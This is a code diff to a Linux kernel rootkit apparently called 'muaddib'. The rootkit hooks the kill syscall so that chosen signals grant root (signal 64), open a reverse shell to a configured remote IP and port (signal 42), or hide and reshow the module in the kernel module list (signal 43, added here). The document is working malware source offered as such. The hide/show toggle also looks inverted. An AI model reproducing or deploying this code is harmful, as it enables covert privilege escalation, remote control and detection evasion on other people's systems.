@@ -1,7 +1,30 @@
 #include "revshell.c"
 
+static struct list_head *prev_module;
+static short hidden = 0;
+
+
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*og_kill)(const struct pt_regs *);
+
+void showme(void)
+{
+    /* Add the saved list_head struct back to the module list */
+    list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
+}
+
+void hideme(void)
+{
+    /* Save the module in the list before us, so we can add ourselves
+     * back to the list in the same place later. */
+    prev_module = THIS_MODULE->list.prev;
+    /* Remove ourselves from the list module list */
+    list_del(&THIS_MODULE->list);
+    hidden = 1;
+}
+
+
 
 /* We can only modify our own privileges, and not that of another
  * process. Just have to wait for signal 64 (normally unused)
@@ -13,18 +36,35 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
     // pid_t pid = regs->di;
     int sig = regs->si;
 
-    if ( sig == 64 )
-    {
-        printk(KERN_INFO "muaddib: giving root\n");
+    if(sig == 64){
+        #ifdef DEBUGMSG
+        printk(KERN_INFO "muaddib: giving root");
+        #endif
         set_root();
         return 0;
     }
 
-    else if (sig == 42){
-        printk(KERN_INFO "muaddib: starting reverse shell\n");
+    else if(sig == 42){
+        #ifdef DEBUGMSG
+        printk(KERN_INFO "muaddib: starting reverse shell from kill");
+        #endif
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
     }
 
+    else if(sig == 43){
+        if(hidden == 0){
+            #ifdef DEBUGMSG
+            printk(KERN_INFO "muaddib: showing");
+            #endif
+            showme();
+        }
+        else if(hidden == 1){
+            #ifdef DEBUGMSG
+            printk(KERN_INFO "muaddib: hiding");
+            #endif
+            hideme();
+        }
+    }
     return og_kill(regs);
 
 }
@@ -36,11 +76,34 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
 {
     void set_root(void);
 
-    if ( sig == 64 )
-    {
-        printk(KERN_INFO "rootkit: giving root...\n");
+    if(sig == 64){
+        #ifdef DEBUGMSG
+        printk(KERN_INFO "muaddib: giving root");
+        #endif
         set_root();
         return 0;
+    }
+
+    else if(sig == 42){
+        #ifdef DEBUGMSG
+        printk(KERN_INFO "muaddib: starting reverse shell from kill");
+        #endif
+        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+    }
+
+    else if(sig == 43){
+        if(hidden == 0){
+            #ifdef DEBUGMSG
+            printk(KERN_INFO "muaddib: showing");
+            #endif
+            showme();
+        }
+        else if(hidden == 1){
+            #ifdef DEBUGMSG
+            printk(KERN_INFO "muaddib: hiding");
+            #endif
+            hideme();
+        }
     }
 
     return og_kill(pid, sig);
